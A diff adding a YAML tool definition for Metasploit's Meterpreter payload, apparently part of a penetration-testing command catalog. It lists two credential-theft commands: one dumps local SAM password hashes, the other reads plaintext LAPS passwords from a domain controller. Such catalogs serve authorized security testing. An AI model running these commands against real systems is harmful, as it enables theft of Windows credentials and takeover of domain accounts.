@@ -1,0 +1,22 @@
+---
+name: Meterpreter
+description: Metasploit's network-extensible payload with in-memory DLL injection stagers
+os: Linux
+ptf_module: modules/exploitation/metasploit
+---
+commands:
+  - "Dump Local SAM Database via Meterpreter":
+    - type: ["meterpreter","interactive"]
+    - text: "run post/windows/gather/hashdump"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Read Plaintext LAPS Passwords from Domain Controller":
+    - type: ["meterpreter","interactive"]
+    - text: "run post/windows/gather/credentials/enum_laps"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
